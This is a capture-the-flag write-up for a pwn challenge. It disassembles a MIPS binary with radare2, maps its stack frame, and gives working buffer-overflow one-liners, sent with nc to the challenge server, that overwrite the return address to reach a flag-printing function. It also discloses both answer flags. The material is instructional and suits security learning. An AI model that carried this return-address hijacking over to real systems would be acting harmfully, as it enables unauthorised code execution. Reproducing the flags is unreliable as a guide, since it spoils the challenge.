STOP GAN (**pwn**)

    Success, you've gotten the picture of your lost love, not knowing 
    that pictures and the things you take pictures of are generally two 
    seperate things, you think you've rescue them and their brethren by 
    downloading them all to your ships hard drive. They're still being 
    eaten, but this is a fact that has escaped you entirely. Your 
    thoughts swiftly shift to revenge. It's important now to stop this 
    program from destroying these "Cauliflowers" as they're referred 
    to, ever again.
    

Zip-file contains some executable `bof` and some C source code 
`console.c`. From source code we can read that our first goal is simply 
overflow buffer of `bof` binary, which is run by `console` program.
Also, from `console.c` it looks like `bof` is MIPS binary, check it:

    $ file ./bof
    ./bof: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped

Typically on x86/amd64/arm system you need `qemu-mipsel` to run such 
executables, and `console.c` tries do it. But it is not necessary 
to compile `console.c`, because qemu can be invoked manually:

    $ qemu-mipsel ./bof
    Cauliflower systems never crash >>
    hello

Okay, it is must be very easy just to overflow buffer. Say, 1 kb 
should be enough:

    $ python -c "print('A'*1024)" | qemu-mipsel ./bof
    Cauliflower systems never crash >>
    qemu-mipsel: /build/qemu-DqynNa/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion `!have_tb_lock' failed.
    qemu-mipsel: /build/qemu-DqynNa/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion `!have_tb_lock' failed.
    Segmentation fault

And now we should send it to the given address (not to forget prepend 
trash with 'run' command for `console` program):

    $ python -c "print('run\n'+'A'*1024)" | nc buffer-overflow.ctfcompetition.com 1337
    Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
     Bonus flag for controlling the crash.

    Console commands: 
    run
    quit
    >>Inputs: run
    CTF{Why_does_cauliflower_threaten_us}
    Cauliflower systems never crash >>
    segfault detected! ***CRASH***
    Console commands: 
    run
    quit
    >>

Here is first flag:

**CTF{Why_does_cauliflower_threaten_us}**


Now next to the second flag. Use radare2 for it. As MIPS instruction 
set can looked unfamiliar, one can turn on disasm descriptions to ease 
understanding of what is going on. Essentially, the buffer overflow 
exploitation must not differ significally from those of x86 
architecture. Because with MIPS we have almost exactly the same: 

  - *stack* that is contigous block of memory;
  - *frame pointer* and *stack pointer* - two addresses within 
    *stack* that specify *stack frame* used for function arguments and
    local variables (they are `fp` and `sp` in radare2);
  - *return address* that is pushed to the *stack* on function call and 
    poped from stack when returning from it (it is `ra` in radare2).

Some disassembling:

    $ r2 ./bof
     -- The Hard ROP Cafe
    [0x00400530]> aa
    [x] Analyze all flags starting with sym. and entry0 (aa)
    [0x00400530]> e asm.describe =true
    [0x00400530]> afl~main
    0x00474504   15 384          sym._nl_unload_domain
    0x004032b0  418 6248 -> 5732 sym._nl_load_domain
    0x004466c0    1 60           sym._IO_switch_to_main_wget_area
    0x00402f80   39 816          sym._nl_find_domain
    0x00400908    6 256          main
    0x00474480    6 132          sym._nl_finddomain_subfreeres
    0x00400a10   35 784          sym.__libc_start_main
    0x0040f53c    1 56           sym._IO_switch_to_main_get_area
    [0x00400530]> pdf@main
    / (fcn) main 256
    |   int main (int argc, char **argv, char **envp);
    |           ; arg int32_t arg_10h @ fp+0x10
    |           ; arg int32_t arg_18h @ fp+0x18
    |           ; var int32_t var_10h @ sp+0x10
    |           ; var int32_t var_120h @ sp+0x120
    |           ; var int32_t var_124h @ sp+0x124
    |           ; arg int argc @ a0
    |           ; arg char **argv @ a1
    |           0x00400908      0b001c3c       lui gp, 0xb                 ; loads a 16-bit immediate operand into the upper 16-bits of the register specified.
    |           0x0040090c      68809c27       addiu gp, gp, -0x7f98       ; add sign-extended constants (or copy one register to another: addi $1, $2, 0)
    |           0x00400910      21e09903       addu gp, gp, t9             ; adds two registers
    |           0x00400914      d8febd27       addiu sp, sp, -0x128        ; add sign-extended constants (or copy one register to another: addi $1, $2, 0)
    |           0x00400918      2401bfaf       sw ra, (var_124h)           ; sw $t,C($s), stores a word into: MEM[$s+C] and the following 3 bytes.
    |           0x0040091c      2001beaf       sw fp, (var_120h)           ; sw $t,C($s), stores a word into: MEM[$s+C] and the following 3 bytes.
    |           0x00400920      25f0a003       move fp, sp                 ; moves a register value into another register (pseudoinstruction).
    ........................................................................
    |      |    0x004009a0      1000dc8f       lw gp, (arg_10h)            ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |      |    0x004009a4      1c00c227       addiu v0, fp, 0x1c          ; add sign-extended constants (or copy one register to another: addi $1, $2, 0)
    |      |    0x004009a8      25284000       move a1, v0                 ; moves a register value into another register (pseudoinstruction).
    |      |    0x004009ac      3480828f       lw v0, -0x7fcc(gp)          ; [0x4a09a4:4]=0x470000 ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |      |    0x004009b0      f4544424       addiu a0, v0, 0x54f4        ; add sign-extended constants (or copy one register to another: addi $1, $2, 0); argc
    |      |    0x004009b4      3881828f       lw v0, -sym.__isoc99_scanf(gp) ; [0x4a0aa8:4]=0x408740 sym.__isoc99_scanf ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |      |    0x004009b8      25c84000       move t9, v0                 ; moves a register value into another register (pseudoinstruction).
    |      |    0x004009bc      601f1104       bal sym.__isoc99_scanf      ; branch and link ; int scanf(const char *format)
    |      |    0x004009c0      00000000       nop                         ; no operation
    |      |    0x004009c4      1000dc8f       lw gp, (arg_10h)            ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |      |    0x004009c8      1800c28f       lw v0, (arg_18h)            ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |      |,=< 0x004009cc      07004014       bnez v0, 0x4009ec
    |      ||   0x004009d0      00000000       nop                         ; no operation
    |      ||   0x004009d4      3080828f       lw v0, -loc.__ehdr_start(gp) ; [0x4a09a0:4]=0x400000 loc.__ehdr_start ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |      ||   0x004009d8      40084224       addiu v0, v0, 0x840         ; add sign-extended constants (or copy one register to another: addi $1, $2, 0)
    |      ||   0x004009dc      25c84000       move t9, v0                 ; moves a register value into another register (pseudoinstruction).
    |      ||   0x004009e0      97ff1104       bal sym.local_flag          ; branch and link
    |      ||   0x004009e4      00000000       nop                         ; no operation
    |      ||   0x004009e8      1000dc8f       lw gp, (arg_10h)            ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |      |`-> 0x004009ec      25100000       move v0, zero               ; moves a register value into another register (pseudoinstruction).
    |      |    ; CODE XREF from main (0x400978)
    |      `--> 0x004009f0      25e8c003       move sp, fp                 ; moves a register value into another register (pseudoinstruction).
    |           0x004009f4      2401bf8f       lw ra, (var_124h)           ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |           0x004009f8      2001be8f       lw fp, (var_120h)           ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |           0x004009fc      2801bd27       addiu sp, sp, 0x128         ; add sign-extended constants (or copy one register to another: addi $1, $2, 0)
    |           0x00400a00      0800e003       jr ra                       ; jumps to the address contained in the specified register
    \           0x00400a04      00000000       nop                         ; no operation
    [0x00400530]> 

Important things are:

  - `main` function uses 0x128 = 296 bytes of stack in total, from which:
  - 4 bytes are used for return address `ra` (in the end it is loaded 
  from stack and program just jamped to this address - see 
  `lw ra, (var_124h)` and `jr ra`)
  - 4 bytes are used for stack frame pointer `fp` (which also will be 
  restored before returning from `main`)
  - the rest 0x120 = 288 bytes of stack are local variables
  - `scanf()` reads data to `fp+0x1c` which is the same as `sp+0x1c` 
  because of `mov fp, sp` after function's prologue, i.e. we can 
  safely pass up to 0x120 - 0x1c = 0x104 = 260 characters before 
  starting to overwrite at first `fp` value and then `ra` value
  - there is very interesting subroutine `sym.local_flag`

Stack layout can be represented as following (I prefer left-to-right 
layout instead of top-to-bottom because it is more natural for me and 
can give clearer view on what is going on when we write to the buffer 
and beyond it's boundaries):

     sp[0]            sp[28]          sp[288]    sp[292]   sp[296]
     buf[-28]         buf[0]          buf[260]   buf[264]  buf[268]
     -------------------------------------------------------------------------
    | char dummy[28] | char buf[260] |    fp    |    ra   | <caller's locals> | ...
     -------------------------------------------------------------------------

Check our suggestions (remember that `scanf()` also writes 
NULL-termination character to the end of the buffer, so actual number 
of written bytes are one plus size of input):

    $ python -c "print('A'*261)" | qemu-mipsel ./bof
    Cauliflower systems never crash >>
    $ python -c "print('A'*263)" | qemu-mipsel ./bof
    Cauliflower systems never crash >>
    $ python -c "print('A'*264)" | qemu-mipsel ./bof
    Cauliflower systems never crash >>
    Cauliflower systems never crash >>
    $ python -c "print('A'*265)" | qemu-mipsel ./bof
    Cauliflower systems never crash >>
    qemu: uncaught target signal 4 (Illegal instruction) - core dumped
    Illegal instruction
    .........

Wow, it seems like writing to `fp` does not cause any problems. I think 
it is because caller of `main()` does not use this value (his stack 
pointer).
But look, writing to `ra` leads to some weird results. It is because 
program jumps to some strange address of memory which contains byte 
trash and not the working code.

Now let's think what jumping address can be of our interest. It is very 
desirable to jump to `0x004009d4`, for example, so execution flow 
enters function `sym.local_flag`, which is obviously our goal.
The problem is, this address contains byte `0x09` which in fact is 
`'\t'` whitespace character and `scanf()` will replace it with `'\0'` 
and stop reading. We need address that do not contain any whitespace 
character, and not contain '\0' (except at the end, or in the high 
bytes). Let's look into `sym.local_flag` itself:

    [0x00400530]> pdf@sym.local_flag
    / (fcn) sym.local_flag 84
    |   sym.local_flag (int32_t arg1, int32_t arg_10h);
    |           ; arg int32_t arg_10h @ fp+0x10
    |           ; var int32_t var_10h @ sp+0x10
    |           ; var int32_t var_18h @ sp+0x18
    |           ; var int32_t var_1ch @ sp+0x1c
    |           ; arg int32_t arg1 @ a0
    |           ; CALL XREF from main (0x4009e0)
    |           0x00400840      0b001c3c       lui gp, 0xb                 ; loads a 16-bit immediate operand into the upper 16-bits of the register specified.
    |           0x00400844      30819c27       addiu gp, gp, -0x7ed0       ; add sign-extended constants (or copy one register to another: addi $1, $2, 0)
    |           0x00400848      21e09903       addu gp, gp, t9             ; adds two registers
    |           0x0040084c      e0ffbd27       addiu sp, sp, -0x20         ; add sign-extended constants (or copy one register to another: addi $1, $2, 0)
    |           0x00400850      1c00bfaf       sw ra, (var_1ch)            ; sw $t,C($s), stores a word into: MEM[$s+C] and the following 3 bytes.
    |           0x00400854      1800beaf       sw fp, (var_18h)            ; sw $t,C($s), stores a word into: MEM[$s+C] and the following 3 bytes.
    |           0x00400858      25f0a003       move fp, sp                 ; moves a register value into another register (pseudoinstruction).
    |           0x0040085c      1000bcaf       sw gp, (var_10h)            ; sw $t,C($s), stores a word into: MEM[$s+C] and the following 3 bytes.
    |           0x00400860      3480828f       lw v0, -0x7fcc(gp)          ; [0x4a09a4:4]=0x470000 ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |           0x00400864      74544424       addiu a0, v0, 0x5474        ; 'tT' ; add sign-extended constants (or copy one register to another: addi $1, $2, 0); arg1
    |           0x00400868      3080828f       lw v0, -loc.__ehdr_start(gp) ; [0x4a09a0:4]=0x400000 loc.__ehdr_start ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |           0x0040086c      30074224       addiu v0, v0, 0x730         ; add sign-extended constants (or copy one register to another: addi $1, $2, 0)
    |           0x00400870      25c84000       move t9, v0                 ; moves a register value into another register (pseudoinstruction).
    |           0x00400874      aeff1104       bal sym.print_file          ; branch and link
    |           0x00400878      00000000       nop                         ; no operation
    |           0x0040087c      1000dc8f       lw gp, (arg_10h)            ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |           0x00400880      25200000       move a0, zero               ; moves a register value into another register (pseudoinstruction).
    |           0x00400884      2081828f       lw v0, -sym.exit(gp)        ; [0x4a0a90:4]=0x407b28 sym.exit ; lw $t,C($s), loads the word stored from: MEM[$s+C] and the following 3 bytes.
    |           0x00400888      25c84000       move t9, v0                 ; moves a register value into another register (pseudoinstruction).
    |           0x0040088c      a61c1104       bal sym.exit                ; branch and link ; void exit(int status)
    \           0x00400890      00000000       nop                         ; no operation


Yeah, this is our day! Let's take address `0x00400858`, I like it 
because it restores `fp` value for something useful and we must not 
think a lot about what to write to it.
All pieces together: 260 bytes of trash, 4 bytes of more trash 
(because `fp` will be overwritten very soon) and 4 bytes of return 
address to `0x00400858` (remember byte ordering, it is 58:08:40:00 in 
order), high byte of which we may not send, `scanf()` will write it 
for us as NULL-terminator.
Try it:

    $ python -c "print('A'*260 + 'A'*4 + '\x58\x08\x40')" | qemu-mipsel ./bof
    Cauliflower systems never crash >>
    could not open flag
    $ 

Notice that there is no segmentation fault, the program thinks that 
everything is Ok. And there is message that it tries but could not open 
a flag tells us that we are on the right way. Check it with remote 
server:

    $ python -c "print('run\n' + 'A'*260 + 'A'*4 + '\x58\x08\x40')" | nc buffer-overflow.ctfcompetition.com 1337
    Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
     Bonus flag for controlling the crash.

    Console commands: 
    run
    quit
    >>Inputs: run
    CTF{controlled_crash_causes_conditional_correspondence}
    Cauliflower systems never crash >>

    Console commands: 
    run
    quit
    >>

The second one:

**CTF{controlled_crash_causes_conditional_correspondence}**
